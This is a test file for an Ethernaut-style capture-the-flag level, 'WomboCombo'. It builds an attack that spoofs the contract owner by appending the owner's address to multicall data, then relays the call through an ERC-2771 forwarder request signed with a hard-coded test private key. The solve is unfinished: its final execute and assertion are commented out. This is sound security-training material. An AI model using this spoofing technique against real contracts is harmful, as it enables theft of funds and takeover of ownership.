const WomboComboFactory = artifacts.require('./levels/WomboComboFactory.sol');
const Staking = artifacts.require('./levels/Staking.sol');
const WomboToken = artifacts.require('WomboToken');
const WomboForwarder = artifacts.require('WomboForwarder');

const Ethernaut = artifacts.require('./Ethernaut.sol');
const {
  BN,
  constants,
  expectEvent,
  expectRevert,
} = require('openzeppelin-test-helpers');
const utils = require('../utils/TestUtils');
const { ethers, upgrades } = require('hardhat');
const ethSigUtil = require('eth-sig-util');


contract('WomboCombo', function (accounts) {
  let ethernaut;
  let level;
  let owner = accounts[1];
  let player = accounts[0];
  let statproxy;

  const EIP712Domain = [
    { name: 'name', type: 'string' },
    { name: 'version', type: 'string' },
    { name: 'chainId', type: 'uint256' },
    { name: 'verifyingContract', type: 'address' },
    { name: 'salt', type: 'bytes32' },
  ];

  function domainType(domain) {
    return EIP712Domain.filter(({ name }) => domain[name] !== undefined);
  }

  before(async function () {
    ethernaut = await utils.getEthernautWithStatsProxy();
    level = await WomboComboFactory.new();
    await ethernaut.registerLevel(level.address);
  });

  it('should allow the player to solve the level', async function () {
    const instance = await utils.createLevelInstance(
      ethernaut,
      level.address,
      player,
      Staking,
      { from: player, value: web3.utils.toWei('0.001', 'ether') }
    );

    // Init checks
    let stakingTokenAddress = await instance.stakingToken();
    let rewardTokenAddress = await instance.rewardsToken();
    let forwarderAddress = await instance.forwarder();
    const stakingToken = new WomboToken(stakingTokenAddress);
    const rewardToken = new WomboToken(rewardTokenAddress);
    const forwarder = new WomboForwarder(forwarderAddress);

    assert.notEqual(await instance.owner(), ethers.constants.AddressZero);
    assert.equal(await stakingToken.balanceOf(player), 100 * 10 ** 18);
    assert.equal(await rewardToken.balanceOf(instance.address), 100000000 * 10 ** 18);

    // Solve level
    let completed = await utils.submitLevelInstance(
      ethernaut,
      level.address,
      instance.address,
      player
    );
    assert.equal(completed, false);

    const owner = await instance.owner();

    const msgSenderCall = web3.eth.abi.encodeFunctionCall(
      {
        name: 'msgSender',
        type: 'function',
        inputs: [],
      },
      [],
    );

    const data = web3.eth.abi.encodeFunctionCall(
      {
        name: 'multicall',
        type: 'function',
        inputs: [
          {
            internalType: 'bytes[]',
            name: 'data',
            type: 'bytes[]',
          },
        ],
      },
      [[web3.utils.encodePacked({ value: msgSenderCall, type: 'bytes' }, { value: owner, type: 'address' })]],
    );

    const req = {
      from: player,
      to: instance.address,
      value: '0',
      gas: '1000000',
      nonce: Number(0),
      deadline: Number(ethers.constants.MaxUint256),
      data,
    };

    // EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)

    const domain = await forwarder.DOMAIN_SEPARATOR();
    const types = {
      EIP712Domain: [
        { name: 'name', type: 'string' },
        { name: 'version', type: 'string' },
        { name: 'chainId', type: 'uint256' },
        { name: 'verifyingContract', type: 'address' },
      ],
      ForwardRequest: [
        { name: 'from', type: 'address' },
        { name: 'to', type: 'address' },
        { name: 'value', type: 'uint256' },
        { name: 'gas', type: 'uint256' },
        { name: 'nonce', type: 'uint256' },
        { name: 'deadline', type: 'uint256' },
        { name: 'data', type: 'bytes' },
      ],
    };

    console.log( {
      types: types,
      domain: domain,
      primaryType: 'ForwardRequest',
      message: req,
    })
    // console.log(ethSigUtil.SignTypedDataVersion.V1)

    const signature = await ethSigUtil.signTypedData({
      privateKey: '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
      data: {
        types: types,
        domain: {
          chainId: 1,
          name: "Forwarder",
          // salt?: ArrayBuffer,
          verifyingContract: forwarderAddress,
          version: "1"
        },
        primaryType: 'ForwardRequest',
        message: req,
      },
      version: "V4",
    });

    // expect(await this.forwarder.verify(req, signature)).to.equal(true);

    // const receipt = await this.forwarder.execute(req, signature);

    // stakingToken.approve(instance.address, 100 * 10 ** 18);
    // instance.stake(100 * 10 ** 18);

    // completed = await utils.submitLevelInstance(
    //   ethernaut,
    //   level.address,
    //   instance.address,
    //   player
    // );
    // assert.equal(completed, true);
  });
});
